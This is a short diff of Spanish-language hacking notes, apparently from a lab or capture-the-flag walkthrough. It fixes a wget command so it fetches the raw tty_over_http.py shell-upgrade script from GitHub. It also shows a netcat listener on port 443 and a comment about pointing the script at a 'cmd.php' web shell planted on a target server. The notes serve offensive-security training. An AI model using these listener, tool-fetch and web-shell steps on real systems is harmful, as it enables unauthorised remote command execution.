@@ -2021,7 +2021,8 @@ nc -nlvp 443 # No deberia estar entablando la conexión
 # vamos al enlace de s4vitar para descargar script mkfifo y obtener tty
 # https://github.com/s4vitar/ttyoverhttp
 # https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py
-wget https://github.com/s4vitar/ttyoverhttp/blob/master/tty_over_http.py
+# Damos clic en RAW
+wget https://raw.githubusercontent.com/s4vitar/ttyoverhttp/refs/heads/master/tty_over_http.py
 # Editamos el archivo para cambiar index.html -> cmd.php el cual es el nombre del script que logramos colar en el servidor
 nano tty_over_http.py
 
